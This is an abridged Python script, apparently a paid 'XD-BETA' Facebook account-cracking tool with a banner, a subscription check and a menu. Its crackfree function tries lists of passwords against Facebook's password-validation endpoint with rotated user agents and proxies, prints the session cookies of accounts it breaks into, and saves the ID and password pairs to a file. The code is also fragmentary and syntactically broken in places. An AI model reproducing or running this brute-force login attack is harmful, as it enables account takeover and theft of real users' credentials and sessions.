...
time.sleep(6)
os.system(f'xdg-open https://github.com/XD-BETAHack99')
print("")
print("")
...
princp=[]
url = 'https://raw.githubusercontent.com/XD-BETA2nd/XLM/main/prox.txt'
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/XD-BETA2nd/XLM/blob/main/bbnew.txt').text
        ua=open('bbnew.txt','w')
...
|        \ /      \ |  \     /  \
 \$$$$$$$$|  $$$$$$\| $$\   /  $$
   ...
   | $$    \$$    $$| $$  \$ | $$
    \$$     \$$$$$$  \$$      \$$
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[0;45m [ WORKING ONLY MOBILE DATA-WIFI ]\033[0;92m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[1;36m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗ 
║ [●]  ᴀᴜᴛʜᴏʀ        : XD-BETA(ONNER-BETA)              ║ 
║ [●]  Ғαcɛвσσκ    :  IBNA AHMED TOM  ║    
║ [●]  ǤιτΗυβ        :          XD-BETA   ║   
║ [●]  ƬѲѲ˩Ƨ         :  XD-BETA--PAID      ║   
║ [●]  V̸E̸R̸S̸I̸O̸N̸     :           V-0.1          ║ 
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m"""
#-----------------[ Aproval ]-------------------#
def Subscraption():
    ...
    os.system('clear')
    print(logo)
    r1 = requests.get("https://github.com/XD-BETA/Beta").text
    if id in r1:
        os.system('clear')
        print(logo)
    else:
        ...
        print("\033[1;39m[\033[1;32m●\033[1;39m]\033[1;33m XD-BETA TooLs Daily Update)✅ \033[0;92m")
        ...
        tks = https://wa.me/qr/ZENGN4Q4Y37RD1?text={message}'
...
def menu():
    ...
    print('\033[0;97m=================')
    XD-BETA = input('\x1b[1;92m[+] CHOOSE: ')
    if XD-BETA in ['111']:
        login()
        dump_massal()
    elif XD-BETA in ['1']:
        crack_file()
    elif XD-BETA in ['2','02']:
        os.system('xdg-open https://wa.me/+8801608843956')
        os.system("python nono.py")
    elif XD-BETA in ['3','03']:
        result()
    elif XD-BETA in ['0']:
...
def crackfree(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r{bo}[XD-BETA-M2] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;90m[XD-BETA-Cp] {idf} • {pw}')
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[0;92m[XD-BETA-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;96m{kuki} ')
                print('')
                os.system('espeak -a 300 " XD-BETA,  Ok,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
